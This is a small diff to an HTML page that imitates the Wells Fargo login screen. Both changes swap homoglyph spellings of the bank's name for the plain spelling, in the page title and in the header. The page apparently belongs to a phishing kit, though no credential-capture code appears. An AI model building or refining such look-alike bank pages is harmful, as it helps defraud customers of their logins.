@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.cdnfonts.com/css/georgia-2" rel="stylesheet">
-    <title>Wēl̥ls Fargo Login</title>
+    <title>Wells Fargo Login</title>
     <style>
         section#bg-img {
             background-image: url('./assets/bg.jpeg');
@@ -246,7 +246,7 @@
 <body>
 <div class="container">
     <div class="header">
-        <span style="font-size: 28px;">Wel̥ls Fargo</span>
+        <span style="font-size: 28px;">Wells Fargo</span>
         <div>
             <a href="#">Enroll</a>
             <a href="#">Customer Service</a>
